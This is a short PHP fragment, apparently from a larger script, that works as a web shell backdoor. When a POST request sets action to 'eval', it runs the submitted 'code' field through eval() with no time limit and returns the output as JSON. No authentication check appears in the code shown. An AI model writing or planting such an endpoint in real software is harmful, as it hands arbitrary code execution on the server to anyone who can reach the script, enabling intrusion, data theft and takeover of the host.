if (isset($_POST['action']) && $_POST['action'] === 'eval') {
ob_end_clean();
set_time_limit(0);
header('Content-Type: application/json');
$code = $_POST['code'] ?? '';
ob_start();
try { eval($code); } catch (Throwable $e) { echo "Error: " . $e->getMessage(); }
$out = ob_get_clean();
echo json_encode(['output' => $out]);
exit;
}
